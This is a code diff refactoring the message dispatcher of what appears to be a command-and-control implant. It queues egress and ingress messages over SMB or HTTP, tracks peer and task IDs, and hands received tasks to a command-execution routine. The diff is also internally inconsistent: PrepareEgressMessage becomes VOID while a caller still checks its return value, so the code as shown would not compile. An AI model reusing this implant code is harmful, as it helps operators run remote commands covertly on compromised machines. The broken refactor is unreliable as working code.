@@ -1,6 +1,5 @@
 #include <core/include/dispatch.hpp>
 namespace Dispatcher {
-
     DWORD PeekPeerId(const _stream *const stream) {
         HEXANE
 
@@ -26,7 +25,7 @@ namespace Dispatcher {
         }
     }
 
-    VOID RemoveMessage(_stream *target) {
+    VOID RemoveMessage(const _stream *target) {
         HEXANE
 
         _stream *head = Ctx->transport.outbound_queue;
@@ -77,7 +76,7 @@ namespace Dispatcher {
             queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
 
             queue->length   = parser.Length;
-            queue->buffer   = x_realloc(queue->buffer, queue->length);
+            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
 
             x_memcpy(queue->buffer, parser.buffer, queue->length);
             AddMessage(queue);
@@ -101,7 +100,7 @@ namespace Dispatcher {
         uint32_t index      = 1;
 
         const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
-        const auto m_max = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
+        constexpr auto m_max = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
 
         while (length > 0) {
             cb_seg  = length > m_max ? m_max : length;
@@ -127,57 +126,36 @@ namespace Dispatcher {
         }
     }
 
-    BOOL PrepareEgressMessage(_stream *out) {
+    VOID PrepareEgressMessage(_stream *out) {
         HEXANE
 
-        _stream *head   = Ctx->transport.outbound_queue;
         _parser parser  = { };
-        bool success    = true;
-
-        while (head) {
+        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
             if (B_PTR(head->buffer)[0] != 0) {
-                continue; // if a message is inbound , don't process it
+                continue;
             }
-            if (head->buffer) {
-                if (head->length + HEADER_SIZE + out->length + 4 > MESSAGE_MAX) {
-                    break;
-                }
 
-                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-                Stream::PackDword(out, head->peer_id);
-                Stream::PackDword(out, head->task_id);
-                Stream::PackDword(out, head->msg_type);
+            Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
+            Stream::PackDword(out, head->peer_id);
+            Stream::PackDword(out, head->task_id);
+            Stream::PackDword(out, head->msg_type);
 
-                // if message has reached exit node, prepare final header for server by prepending msg body length
-                // else leave as-is for the next client
-
-                if (Ctx->root) {
-                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
-                } else {
-                    out->buffer = x_realloc(out->buffer, out->length + head->length);
-
-                    x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
-                    out->length += head->length;
-                }
+            if (Ctx->root) {
+                Stream::PackBytes(out, B_PTR(head->buffer), head->length);
             } else {
-                success = false;
-                return_defer(ERROR_INVALID_DATA);
+                Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
             }
 
-            head->self = head;
-            head = head->next;
+            break;
         }
 
-        defer:
         Parser::DestroyParser(&parser);
-        return success;
     }
 
     VOID PrepareIngressMessage(_stream *in){
         HEXANE
 
         if (in) {
-            RemoveMessage(in->self); // need a pointer to the message we just sent
             if (PeekPeerId(in) != Ctx->session.peer_id) {
                 OutboundQueue(in);
             } else {
@@ -203,15 +181,15 @@ namespace Dispatcher {
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #else
-            auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
+            const auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
             Dispatcher::OutboundQueue(entry);
             goto retry;
 #endif
-        } else {
-            out = Stream::CreateStream();
-            if (!Dispatcher::PrepareEgressMessage(out)) {
-                return_defer(ntstatus);
-            }
+        }
+
+        out = Stream::CreateStream();
+        if (!Dispatcher::PrepareEgressMessage(out)) {
+            return_defer(ntstatus);
         }
 
 #ifdef TRANSPORT_HTTP
@@ -237,9 +215,7 @@ namespace Dispatcher {
         Parser::UnpackDword(&parser);
 
         Ctx->session.current_taskid = Parser::UnpackDword(&parser);
-
-        auto msg_type = Parser::UnpackDword(&parser);
-        switch (msg_type) {
+        switch (Parser::UnpackDword(&parser)) {
 
             case TypeCheckin:   Ctx->session.checkin = true;
             case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
